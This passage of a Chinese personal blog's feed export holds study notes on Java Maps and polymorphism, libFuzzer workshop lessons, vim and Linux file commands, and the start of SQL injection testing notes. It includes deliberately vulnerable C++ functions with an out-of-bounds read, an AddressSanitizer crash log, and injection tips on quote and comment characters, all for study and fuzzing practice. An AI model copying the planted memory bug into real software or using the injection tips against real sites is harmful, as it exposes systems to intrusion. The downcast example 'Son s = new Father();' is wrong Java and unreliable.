<td><code>containsKey(Object key)</code>  如果此映射包含指定键的映射，则返回 <code>true</code> 。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>containsValue(Object value)</code>  如果此地图将一个或多个键映射到指定的值，则返回 <code>true</code> 。</td>
</tr>
<tr>
<td><code>Set&lt;Map.Entry&lt;K,V&gt;&gt;</code></td>
<td><code>entrySet()</code>  返回此地图中包含的映射的<a href="../../java/util/Set.html"><code>Set</code></a>视图。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>equals(Object o)</code>  将指定的对象与此映射进行比较以获得相等性。</td>
</tr>
<tr>
<td><code>default void</code></td>
<td><code>forEach(BiConsumer&lt;? super K,? super V&gt; action)</code>  对此映射中的每个条目执行给定的操作，直到所有条目都被处理或操作引发异常。</td>
</tr>
<tr>
<td><code>V</code></td>
<td><code>get(Object key)</code>  返回到指定键所映射的值，或 <code>null</code>如果此映射包含该键的映射。</td>
</tr>
<tr>
<td><code>default V</code></td>
<td><code>getOrDefault(Object key, V defaultValue)</code>  返回到指定键所映射的值，或 <code>defaultValue</code>如果此映射包含该键的映射。</td>
</tr>
<tr>
<td><code>int</code></td>
<td><code>hashCode()</code>  返回此地图的哈希码值。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>isEmpty()</code>  如果此地图不包含键值映射，则返回 <code>true</code> 。</td>
</tr>
<tr>
<td><code>Set&lt;K&gt;</code></td>
<td><code>keySet()</code>  返回此地图中包含的键的<a href="../../java/util/Set.html"><code>Set</code></a>视图。</td>
</tr>
<tr>
<td><code>default V</code></td>
<td><code>merge(K key, V value, BiFunction&lt;? super V,? super V,? extends V&gt; remappingFunction)</code>  如果指定的键尚未与值相关联或与null相关联，则将其与给定的非空值相关联。</td>
</tr>
<tr>
<td><code>V</code></td>
<td><code>put(K key, V value)</code>  将指定的值与该映射中的指定键相关联（可选操作）。</td>
</tr>
<tr>
<td><code>void</code></td>
<td><code>putAll(Map&lt;?  extends K,?  extends V&gt; m)</code>  将指定地图的所有映射复制到此映射（可选操作）。</td>
</tr>
<tr>
<td><code>default V</code></td>
<td><code>putIfAbsent(K key, V value)</code>  如果指定的键尚未与某个值相关联（或映射到 <code>null</code> ）将其与给定值相关联并返回  <code>null</code> ，否则返回当前值。</td>
</tr>
<tr>
<td><code>V</code></td>
<td><code>remove(Object key)</code>  如果存在（从可选的操作），从该地图中删除一个键的映射。</td>
</tr>
<tr>
<td><code>default boolean</code></td>
<td><code>remove(Object key, Object value)</code>  仅当指定的密钥当前映射到指定的值时删除该条目。</td>
</tr>
<tr>
<td><code>default V</code></td>
<td><code>replace(K key, V value)</code>  只有当目标映射到某个值时，才能替换指定键的条目。</td>
</tr>
<tr>
<td><code>default boolean</code></td>
<td><code>replace(K key, V oldValue, V newValue)</code>  仅当当前映射到指定的值时，才能替换指定键的条目。</td>
</tr>
<tr>
<td><code>default void</code></td>
<td><code>replaceAll(BiFunction&lt;? super K,? super V,? extends V&gt; function)</code>  将每个条目的值替换为对该条目调用给定函数的结果，直到所有条目都被处理或该函数抛出异常。</td>
</tr>
<tr>
<td><code>int</code></td>
<td><code>size()</code>  返回此地图中键值映射的数量。</td>
</tr>
<tr>
<td><code>Collection&lt;V&gt;</code></td>
<td><code>values()</code>  返回此地图中包含的值的<a href="../../java/util/Collection.html"><code>Collection</code></a>视图。</td>
</tr>
</tbody></table>
<h2 id="遍历-1"><a href="#遍历-1" class="headerlink" title="遍历"></a>遍历</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line">      map.put(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">      map.put(<span class="string">&quot;2&quot;</span>, <span class="string">&quot;value2&quot;</span>);</span><br><span class="line">      map.put(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;value3&quot;</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//第一种：普遍使用，二次取值</span></span><br><span class="line">      System.out.println(<span class="string">&quot;通过Map.keySet遍历key和value：&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (String key : map.keySet()) &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;key= &quot;</span>+ key + <span class="string">&quot; and value= &quot;</span> + map.get(key));</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//第二种</span></span><br><span class="line">      System.out.println(<span class="string">&quot;通过Map.entrySet使用iterator遍历key和value：&quot;</span>);</span><br><span class="line">      Iterator&lt;Map.Entry&lt;String, String&gt;&gt; it = map.entrySet().iterator();</span><br><span class="line">      <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">       Map.Entry&lt;String, String&gt; entry = it.next();</span><br><span class="line">       System.out.println(<span class="string">&quot;key= &quot;</span> + entry.getKey() + <span class="string">&quot; and value= &quot;</span> + entry.getValue());</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//第三种：推荐，尤其是容量大时</span></span><br><span class="line">      System.out.println(<span class="string">&quot;通过Map.entrySet遍历key和value&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : map.entrySet()) &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;key= &quot;</span> + entry.getKey() + <span class="string">&quot; and value= &quot;</span> + entry.getValue());</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">      <span class="comment">//第四种</span></span><br><span class="line">      System.out.println(<span class="string">&quot;通过Map.values()遍历所有的value，但不能遍历key&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (String v : map.values()) &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;value= &quot;</span> + v);</span><br><span class="line">      &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>java官方文档</p>
<p>菜鸟教程：<a href="https://www.runoob.com/java/java-collections.html">https://www.runoob.com/java/java-collections.html</a></p>
]]></content>
      <categories>
        <category>code</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>notes</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java 多态</title>
    <url>/2018/01/06/java-%E5%A4%9A%E6%80%81/</url>
    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>同一个对象在不同时刻所体现的不同状态<br>子类可以当做父类使用，但是父类不能当做子类使用（狗是动物，但动物不是狗）</p>
<h2 id="多态的前提"><a href="#多态的前提" class="headerlink" title="多态的前提"></a>多态的前提</h2><blockquote>
<ul>
<li>有继承或者实现</li>
<li>有方法重写</li>
<li>有父类或者父类解救引用指向子类对象 ： 父 F &#x3D; new 子</li>
</ul>
</blockquote>
<span id="more"></span>

<h2 id="多态的分类"><a href="#多态的分类" class="headerlink" title="多态的分类"></a>多态的分类</h2><p>1.具体类多态</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">extends</span> <span class="title class_">Father</span> &#123; &#125;</span><br><span class="line"><span class="type">Father</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Son</span>();</span><br></pre></td></tr></table></figure>

<p>2.抽象类多态</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Father</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">extends</span> <span class="title class_">Father</span> &#123; &#125;</span><br><span class="line"><span class="type">Father</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Son</span>();</span><br></pre></td></tr></table></figure>

<p>3.接口类多态</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Father</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">implements</span> <span class="title class_">Father</span> &#123; &#125;</span><br><span class="line"><span class="type">Father</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Son</span>();</span><br></pre></td></tr></table></figure>

<h2 id="多态中的成员访问特点"><a href="#多态中的成员访问特点" class="headerlink" title="多态中的成员访问特点"></a>多态中的成员访问特点</h2><ol>
<li>成员变量<br>编译看father，运行看son</li>
<li>构造方法<br>创建子类对象的时候要先访问父类的构造方法，对父类的数据进行初始化（子类所有的构造方法都会先访问父类的无参构造）</li>
<li>成员方法<br>编译看father，运行看son（方法有重写）</li>
<li>静态方法<br>编译运行都是看father（和类相关）</li>
</ol>
<h2 id="多态的利与弊"><a href="#多态的利与弊" class="headerlink" title="多态的利与弊"></a>多态的利与弊</h2><ul>
<li>好处<ul>
<li>提高代码的维护性（继承）</li>
<li>提高代码的扩展性（多态）</li>
</ul>
</li>
<li>弊处<ul>
<li>父类不能使用子类的特有功能</li>
</ul>
</li>
</ul>
<h2 id="多态中的转型"><a href="#多态中的转型" class="headerlink" title="多态中的转型"></a>多态中的转型</h2><p>1.向上转型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Father</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Son</span>();</span><br></pre></td></tr></table></figure>

<p>2.向下转型：把父类的引用强制转换成子类的引用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Son</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Father</span>();</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>code</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>-java</tag>
      </tags>
  </entry>
  <entry>
    <title>libFuzzer workshop study</title>
    <url>/2021/11/15/libFuzzer-workshop-study/</url>
    <content><![CDATA[<h1 id="libFuzzer-workshop-study"><a href="#libFuzzer-workshop-study" class="headerlink" title="libFuzzer workshop study"></a>libFuzzer workshop study</h1><h2 id="libfuzzer-基本使用方法（官方）"><a href="#libfuzzer-基本使用方法（官方）" class="headerlink" title="libfuzzer 基本使用方法（官方）"></a>libfuzzer 基本使用方法（官方）</h2><p>The first step in using libFuzzer on a library is to implement a <em>fuzz target</em> – a function that accepts an array of bytes and does something interesting with these bytes using the API under test. Like this:</p>
<p>fuzzer target的主要写法如下:</p>
<figure class="highlight cc"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fuzz_target.cc</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> <span class="title">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Data, <span class="type">size_t</span> Size)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//DoSomethingInterestingWithMyAPI待测试函数</span></span><br><span class="line">  <span class="built_in">DoSomethingInterestingWithMyAPI</span>(Data, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// Non-zero return values are reserved for future use.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译目标</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -fsanitize=fuzzer,address mytarget.c</span><br></pre></td></tr></table></figure>

<p>最后需要链接libfuzzer.a</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -fsanitize-coverage=trace-pc-guard -fsanitize=address your_lib.cc fuzz_target.cc libFuzzer.a -o my_fuzzer</span><br></pre></td></tr></table></figure>

<p>运行fuzzer,当然也是可以使用相关语法对语料库进行操作，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#减小语料库的大小</span></span><br><span class="line"><span class="built_in">mkdir</span> NEW_CORPUS_DIR  <span class="comment"># Store minimized corpus here.</span></span><br><span class="line">./my_fuzzer -merge=1 NEW_CORPUS_DIR FULL_CORPUS_DIR</span><br><span class="line"></span><br><span class="line"><span class="comment">#interesting test 会被加入到语料库中</span></span><br><span class="line">./my_fuzzer -merge=1 CURRENT_CORPUS_DIR NEW_POTENTIALLY_INTERESTING_INPUTS_DIR</span><br><span class="line"></span><br><span class="line"><span class="comment">#开始模糊测试，当然语料库也是可以为空的</span></span><br><span class="line">./my_fuzzer CORPUS_DIR </span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="lesson-02"><a href="#lesson-02" class="headerlink" title="lesson 02"></a>lesson 02</h2><p>待测试的库vulnerable_functions.h：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//vulnerable_functions.h</span></span><br><span class="line"><span class="comment">// Copyright 2016 Google Inc. All Rights Reserved.</span></span><br><span class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LESSONS_04_VULNERABLE_FUNCTIONS_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LESSONS_04_VULNERABLE_FUNCTIONS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">VulnerableFunction1</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="type">bool</span> result = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (size &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">    result = data[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp;</span><br><span class="line">             data[<span class="number">1</span>] == <span class="string">&#x27;U&#x27;</span> &amp;&amp;</span><br><span class="line">             data[<span class="number">2</span>] == <span class="string">&#x27;Z&#x27;</span> &amp;&amp;</span><br><span class="line">             data[<span class="number">3</span>] == <span class="string">&#x27;Z&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">typename</span> T::value_type <span class="title">DummyHash</span><span class="params">(<span class="type">const</span> T&amp; buffer)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">typename</span> T::value_type hash = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> value : buffer)</span><br><span class="line">    hash ^= value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">auto</span> kMagicHeader = <span class="string">&quot;ZN_2016&quot;</span>;</span><br><span class="line"><span class="keyword">constexpr</span> std::<span class="type">size_t</span> kMaxPacketLen = <span class="number">1024</span>;</span><br><span class="line"><span class="keyword">constexpr</span> std::<span class="type">size_t</span> kMaxBodyLength = <span class="number">1024</span> - <span class="built_in">sizeof</span>(kMagicHeader);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">VulnerableFunction2</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size, <span class="type">bool</span> verify_hash)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (size &lt; <span class="built_in">sizeof</span>(kMagicHeader))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">std::string <span class="title">header</span><span class="params">(<span class="keyword">reinterpret_cast</span>&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data), <span class="keyword">sizeof</span>(kMagicHeader))</span></span>;</span><br><span class="line"></span><br><span class="line">  std::array&lt;<span class="type">uint8_t</span>, kMaxBodyLength&gt; body;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(kMagicHeader, header.<span class="built_in">c_str</span>()))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">auto</span> target_hash = data[--size];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size &gt; kMaxPacketLen)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!verify_hash)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  std::<span class="built_in">copy</span>(data, data + size, body.<span class="built_in">data</span>());</span><br><span class="line">  <span class="keyword">auto</span> real_hash = <span class="built_in">DummyHash</span>(body);</span><br><span class="line">  <span class="keyword">return</span> real_hash == target_hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> std::<span class="type">size_t</span> kZn2016VerifyHashFlag = <span class="number">0x0001000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">VulnerableFunction3</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size, std::<span class="type">size_t</span> flags)</span> </span>&#123;</span><br><span class="line">  <span class="type">bool</span> verify_hash = flags &amp; kZn2016VerifyHashFlag;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">VulnerableFunction2</span>(data, size, verify_hash);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// LESSONS_04_VULNERABLE_FUNCTIONS_H_</span></span></span><br></pre></td></tr></table></figure>

<p>入口点代码</p>
<figure class="highlight cc"><table><tr><td class="code"><pre><span class="line"><span class="comment">//first_fuzzer.cc</span></span><br><span class="line"><span class="comment">// Copyright 2016 Google Inc. All Rights Reserved.</span></span><br><span class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vulnerable_functions.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> <span class="title">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">VulnerableFunction1</span>(data, size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译我们的入口点程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang++ -g -std=c++11 -fsanitize=fuzzer,address first_fuzzer.cc ../../libFuzzer/libFuzzer.a -o first_fuzzer</span><br><span class="line"></span><br><span class="line">clang++ -g -std=c++11 -fsanitize=fuzzer,address second_fuzzer.cc ../../libFuzzer/libFuzzer.a -o second_fuzzer</span><br><span class="line"></span><br><span class="line">clang++ -g -std=c++11 -fsanitize=fuzzer,address third_fuzzer.cc ../../libFuzzer/libFuzzer.a -o third_fuzzer</span><br><span class="line"></span><br><span class="line"><span class="comment">#然后执行程序</span></span><br><span class="line">./first_fuzzer ./corpus1</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==2781==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000049473 at pc 0x000000550501 bp 0x7fff8d6b39c0 sp 0x7fff8d6b39b8</span><br><span class="line">READ of size 1 at 0x602000049473 thread T0</span><br><span class="line">    #0 0x550500 in VulnerableFunction1(unsigned char const*, unsigned long) /home/fourth/fuzz/libfuzzer-workshop-master/lessons/04/./vulnerable_functions.h:22:14</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x602000049473 is located 0 bytes to the right of 3-byte region [0x602000049470,0x602000049473)</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /home/fourth/fuzz/libfuzzer-workshop-master/lessons/04/./vulnerable_functions.h:22:14 in VulnerableFunction1(unsigned char const*, unsigned long)</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  0x0c0480001230: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa</span><br><span class="line">  0x0c0480001240: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa</span><br><span class="line">  0x0c0480001250: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fd</span><br><span class="line">  0x0c0480001260: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa</span><br><span class="line">  0x0c0480001270: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa</span><br><span class="line">=&gt;0x0c0480001280: fa fa fd fa fa fa fd fa fa fa fd fa fa fa[03]fa</span><br><span class="line">  0x0c0480001290: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c04800012a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c04800012b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c04800012c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c04800012d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents 8 application bytes):</span><br><span class="line">  Addressable:           00</span><br><span class="line">  Partially addressable: 01 02 03 04 05 06 07 </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after return:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==2781==ABORTING</span><br><span class="line">MS: 1 ChangeBinInt-; base unit: 9d447627131a2fa79c753457599a7adc3ef03146</span><br><span class="line">0x46,0x55,0x5a,</span><br><span class="line">FUZ</span><br><span class="line">artifact_prefix=&#x27;./&#x27;; Test unit written to ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60</span><br><span class="line">Base64: RlVa</span><br></pre></td></tr></table></figure>

<p>可以清楚的看到我们程序报错的具体函数位置 VulnerableFunction1(unsigned char const*, unsigned long)，也可以看到是内存溢出了，这与实际的情况是符合的。</p>
<p>复现crash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./first_fuzzer ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://releases.llvm.org/5.0.0/docs/LibFuzzer.html#fuzzing-components-of-llvm">https://releases.llvm.org/5.0.0/docs/LibFuzzer.html#fuzzing-components-of-llvm</a></p>
<p><a href="https://github.com/Dor1s/libfuzzer-workshop">https://github.com/Dor1s/libfuzzer-workshop</a></p>
<p><a href="https://www.anquanke.com/post/id/224823">https://www.anquanke.com/post/id/224823</a></p>
<p><a href="https://trustfoundry.net/introduction-to-triaging-fuzzer-generated-crashes/">https://trustfoundry.net/introduction-to-triaging-fuzzer-generated-crashes/</a></p>
]]></content>
      <categories>
        <category>notes</category>
        <category>Fuzzing</category>
      </categories>
      <tags>
        <tag>notes</tag>
        <tag>libFuzzer</tag>
      </tags>
  </entry>
  <entry>
    <title>linux-基础知识</title>
    <url>/2022/04/01/linux-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h1><p>vim是vi的升级</p>
<p>vim有三种模式：普通模式、插入模式、命令模式</p>
<p>&lt; !– more –&gt;</p>
<ol>
<li><p>普通模式-&gt;插入模式：</p>
<ul>
<li>i 光标不动，在原光标的前面插入数据</li>
<li>a光标后移一位，在光标后面插入数据</li>
<li>I在本行的开始位置插入数据</li>
<li>A在本行的结束位置处插入数据</li>
<li>o 在本行下面创建一个空行</li>
<li>O 在本行的上一行创建一个空行</li>
</ul>
</li>
<li><p>普通模式下的命令较多</p>
</li>
<li><p>命令模式下的命令：</p>
<ul>
<li>wq 保存并退出文件</li>
<li>q 退出文件</li>
<li>q! 强制退出</li>
</ul>
</li>
</ol>
<span id="more"></span>

<h1 id="查看文件的方式"><a href="#查看文件的方式" class="headerlink" title="查看文件的方式"></a>查看文件的方式</h1><ol>
<li>cat [-n -b ] filename </li>
<li>tac 倒叙查看文件内容 （从最后一行开始）</li>
<li>head [-n] filename直接查看,默认前10行</li>
<li>tail [-n] filename 倒叙查看，默认前10行</li>
<li>more filename 文件过大，分页显示内容，空格建翻页</li>
<li>wc 文件名 统计一个文件中各种数据的数量计算文件的byte 数，字数，列数等</li>
</ol>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>the fuzzing book study notes</title>
    <url>/2021/11/15/the-fuzzing-book-study-notes/</url>
    <content><![CDATA[<h1 id="The-Researcher-Tour"><a href="#The-Researcher-Tour" class="headerlink" title="The Researcher Tour"></a>The Researcher Tour</h1><p><a href="https://www.fuzzingbook.org/">https://www.fuzzingbook.org</a></p>
<p>Fuzzing: Breaking Things with Random Inputs</p>
<p><em>Create random inputs, and see if they break things.</em> Just let it run long enough and you’ll see.</p>
<span id="more"></span>

<h2 id="Mining-Function-Specifications"><a href="#Mining-Function-Specifications" class="headerlink" title="Mining Function Specifications"></a>Mining Function Specifications</h2><p>当我们测试一个程序的时候，不仅仅需要覆盖所有的行为，也还需要检查他的结果是否符合预期。</p>
<p><em>dynamic invariants</em>的作用：</p>
<ul>
<li>Dynamic invariants provide important information for symbolic fuzzing, such as types and ranges of function arguments.</li>
<li>Dynamic invariants provide pre- and postconditions for formal program proofs and verification.</li>
<li>Dynamic invariants provide a large number of assertions that can check whether function behavior has changed.</li>
<li>Checks provided by dynamic invariants can be very useful as oracles for checking the effects of generated tests</li>
</ul>
<h3 id="code-coverage"><a href="#code-coverage" class="headerlink" title="code coverage"></a>code coverage</h3>]]></content>
      <categories>
        <category>notes</category>
        <category>Fuzzing</category>
      </categories>
      <tags>
        <tag>notes</tag>
        <tag>Fuzzing</tag>
      </tags>
  </entry>
  <entry>
    <title>xiaodiPenetration</title>
    <url>/2021/10/28/xiaodiPenetration/</url>
    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004154745441.png" alt="image-20211004154745441"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">简要明确参数类型</span><br><span class="line">	数字，字符，搜索，json等  -- 搜索  like &quot;%pike%&quot;</span><br><span class="line">简要明确请求方法：</span><br><span class="line">	get,post,cookie,request,http header</span><br><span class="line">	测试使用get还是post：将参数分别以两种形式提交，如果网页是显示的一样的，则网站是post方式传参</span><br><span class="line">注意灵活使用：&#x27;&#x27; &quot;&quot; ) # --+ -- 等</span><br><span class="line">	使用burpsuit进行注入的时候，空格需要换成 + </span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004154810562.png" alt="image-20211004154810562"></p>
<h2 id="access数据库"><a href="#access数据库" class="headerlink" title="access数据库"></a>access数据库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">没有数据库名（不存在） 表名，字段，数据</span><br><span class="line">直接使用猜，或者暴力破解</span><br></pre></td></tr></table></figure>

